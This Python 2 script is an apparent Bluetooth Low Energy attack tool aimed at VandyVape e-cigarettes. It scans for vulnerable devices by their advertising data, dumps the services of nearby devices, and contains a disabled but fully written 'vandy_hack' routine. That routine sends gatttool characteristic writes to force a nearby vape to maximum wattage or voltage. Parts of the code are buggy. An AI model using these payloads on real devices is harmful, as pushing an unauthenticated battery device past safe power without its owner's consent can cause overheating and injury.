# -*- coding: utf-8 -*-
import time
import subprocess
import pexpect
import sys
import os
#import bluepy
from bluepy.btle import Scanner, DefaultDelegate
#Define colors
def Red(skk): print("\033[91m {}\033[00m" .format(skk)) 
def Green(skk): print("\033[92m {}\033[00m" .format(skk))
def Yellow(skk): print("\033[93m {}\033[00m" .format(skk)) 

def menu():

    os.system('clear')

    menu = {}
    menu['1']="- Scan for Vulnerable Devices" 
    menu['2']="- Obtain Services and Data"
    menu['3']="- Attack VandyVape"
    menu['5']="- Exit"
    print ("-----------------------------------")
    while True:
        options=menu.keys()
        options.sort()
        for entry in options: 
            print entry, menu[entry]
        print "\n"
        selection=raw_input("Please Select:" + "\n" + "------------------------------------" + "\n") 
        if selection =='1': 
            scan_devices()
            print ("-----------------------------------")
        elif selection == '2': 
            obtain_Info()
            print ("-----------------------------------")
        elif selection == '3':
            print "not today sucka"
            #vandy_hack()
        elif selection == '4':
            get_attr()
            print ("-----------------------------------")
        elif selection == '5': 
            sys.exit(1)
        else: 
          print "Unknown Option Selected!" 
          #os.system('clear')
          menu()
'''
def vandy_hack():
    
    if len(vulnVandyVape) > 1:
    	for i in range(len(vulnVandyVape)):
    		print str(i) +" - : " +vulnVandyVape[i]
    	n = raw_input("Select device: ")
    	vandy = vulnVandyVape[n]
    elif len(vulnVandyVape) == 0:
    	Red("No vulnerable devices found,Please scan before attack!")
        print "------------------------------------------------------------------------------------------------------------"
	time.sleep(2)
        os.system('clear')
    	menu()
    else:
    	vandy = vulnVandyVape[0]
    address_type = 'random'
    print ("-----------------------------------")
    Green("[+]Compatible device Found : " + vandy)
    print ("-----------------------------------")

    # Run gatttool interactively and random
    gatt = pexpect.spawn('gatttool -I -t ' + " " +  address_type + " " + "-b" + " " + vandy)
    
    # Connect to the device.
    gatt.sendline('connect')
    gatt.expect('Connection successful')

    menuvandy = {}
    menuvandy['1']="- Turn on Power Wattios maximum" 
    menuvandy['2']="- Turn on power Voltage maximum"
    menuvandy['3']="- Return Vape to a secure Power"
    menuvandy['4']="- Back"
    menuvandy['5']="- Exit"
    print ("-----------------------------------")
    while True: 
        options = menuvandy.keys()
        options.sort()
        for entry in options: 
            print entry, menuvandy[entry]
        print "\n"
        selection = raw_input("Please Select:" + "\n" + "------------------------------------" + "\n") 
        if selection =='1': 
        	gatt.sendline('char-write-req  0x000d 04000002bb00000000000000000000000000096f')
        	gatt.expect('Characteristic value was written successfully')
        	Red("[!] Device to maximum Power, please be carefull!")
        	print "------------------------------------------------------------------------------------------------------------"
        elif selection == '2': 
            gatt.sendline('char-write-req 0x000d 040000019a0100000000000000000000000000')
            gatt.expect('Characteristic value was written successfully')
            Red("[!] Device to 4.1V , please be carefull!")
            print "------------------------------------------------------------------------------------------------------------"
        elif selection == '3':
            gatt.sendline('char-write-req 0x000d 040000024a00000000000000000000000000f95e')
            gatt.expect('Characteristic value was written successfully')
            Green("[OK!] Device returned to 74 W")
            print "------------------------------------------------------------------------------------------------------------"
        elif selection == '4': 
            gatt.sendline('disconnect')
            menu()
        elif selection == '5': 
            sys.exit(1)
        else: 
            print "Unknown Option Selected!" 
            menuvandy()

'''

def scan_devices():
	
    print ("-----------------------------------")
    print ("Scanning ... Please Wait")
    print ("-----------------------------------")
    class ScanDelegate(DefaultDelegate):
        def __init__(self):
            DefaultDelegate.__init__(self)
    scanner = Scanner().withDelegate(ScanDelegate())

    # create a list of unique devices that the scanner discovered during a 10-second scan
    devices = scanner.scan(10.0)
    for dev in devices:
	for (adtype, desc, value) in dev.getScanData():
		if value == '8888585403005a31d782c8e95a31d782':
			Green("[+] Discovered "+ dev.getValueText(9) +" device : " + dev.addr)
			vulnVandyVape.append(dev.addr)
        	#else:
            		#Red("[-] Discovered NOT compatible device: " + dev.addr)

def get_attr():
    print ("-----------------------------------")
    print ("Checking attributes...")
    print ("-----------------------------------")

    class ScanDelegate(DefaultDelegate):
        def __init__(self):
            DefaultDelegate.__init__(self)

    scanner = Scanner().withDelegate(ScanDelegate())

    devices = scanner.scan(10.0)

    for dev in devices:
        print "".join("\n")
        print "[*] Device %s (%s), RSSI=%d dB" % (dev.addr, dev.addrType, dev.rssi)
        print "------------------------------------------------------------------------------------------------------------"
        for (adtype, desc, value) in dev.getScanData():
            if desc == "Complete 16b Services":
                if value == "0000fe46-0000-1000-8000-00805f9b34fb":
                    print "Custom UUID of B&O Play A/S"
                    #Complete 16b Services = 0000fe46-0000-1000-8000-00805f9b34fb
            print "  %s = %s" % (desc, value)




def obtain_Info():
    print ("-----------------------------------")
    print ("Please Wait , Obtaining Services...")
    print ("-----------------------------------")
            # create a delegate class to receive the BLE broadcast packets
    class ScanDelegate(DefaultDelegate):
        def __init__(self):
            DefaultDelegate.__init__(self)

        # create a scanner object that sends BLE broadcast packets to the ScanDelegate
    scanner = Scanner().withDelegate(ScanDelegate())

    # create a list of unique devices that the scanner discovered during a 10-second scan
    devices = scanner.scan(10.0)
    # for each device  in the list of devices
    for dev in devices:
        # print  the device's MAC address, its address type,
        # and Received Signal Strength Indication that shows how strong the signal was when the script received the broadcast.
        
        print "".join("\n")
        print "[*] Device %s (%s), RSSI=%d dB" % (dev.addr, dev.addrType, dev.rssi)
        print "------------------------------------------------------------------------------------------------------------"

        # For each of the device's advertising data items, print a description of the data type and value of the data itself
        # getScanData returns a list of tupples: adtype, desc, value
        # where AD Type means “advertising data type,” as defined by Bluetooth convention:
        # https://www.bluetooth.com/specifications/assigned-numbers/generic-access-profile
        # desc is a human-readable description of the data type and value is the data itself
        for (adtype, desc, value) in dev.getScanData():
            print "  %s = %s" % (desc, value)

vulnVandyVape = []
menu()
